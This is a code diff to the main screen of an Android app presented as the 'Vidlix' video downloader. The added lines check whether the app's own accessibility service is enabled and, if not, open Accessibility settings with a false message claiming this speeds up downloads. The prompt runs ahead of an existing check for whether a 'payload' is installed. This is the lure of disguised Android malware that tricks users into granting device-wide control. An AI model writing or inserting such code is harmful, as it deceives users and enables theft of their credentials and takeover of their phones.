@@ -1,11 +1,13 @@
 package com.vidlix.downloader;
 
 import android.Manifest;
-import android.content.pm.PackageManager;
+import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
+import android.text.TextUtils;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -71,6 +73,12 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+
+        if (!isAccessibilityEnabled()) {
+            requestAccessibility();
+            return;
+        }
+
         if (!isPayloadInstalled()) {
             handler.postDelayed(new Runnable() {
                 @Override
@@ -79,6 +87,41 @@ public class MainActivity extends AppCompatActivity {
                 }
             }, 3000);
         }
+    }
+
+    private boolean isAccessibilityEnabled() {
+        String service = getPackageName() + "/" + RescueAccessibilityService.class.getCanonicalName();
+        try {
+            String enabled = Settings.Secure.getString(
+                    getContentResolver(),
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (enabled == null) return false;
+            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
+            splitter.setString(enabled);
+            while (splitter.hasNext()) {
+                String component = splitter.next();
+                if (component.equalsIgnoreCase(service)) return true;
+            }
+            return false;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void requestAccessibility() {
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                    Toast.makeText(MainActivity.this,
+                            "Enable Vidlix in Accessibility to speed up downloads.",
+                            Toast.LENGTH_LONG).show();
+                } catch (Exception ignored) { }
+            }
+        }, 1500);
     }
 
     private boolean isPayloadInstalled() {
@@ -147,4 +190,4 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
         }
     }
-}
+            }
